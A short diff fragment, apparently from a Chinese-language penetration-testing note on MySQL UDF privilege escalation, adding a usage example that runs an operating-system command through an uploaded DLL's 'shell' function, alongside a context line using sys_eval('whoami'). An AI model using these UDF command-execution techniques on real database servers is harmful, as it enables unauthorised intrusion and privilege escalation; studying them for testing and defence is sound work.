@@ -46,3 +46,10 @@ SELECT sys_eval ('whoami'); # 执行命令
 
 方法与上面类似，可以使用tools的UDF提权脚本，或者上传dll文件，命令执行函数名为 shell
 
+使用方法：
+
+```SQL
+
+SELECT shell('cmd','whoami')
+
+```
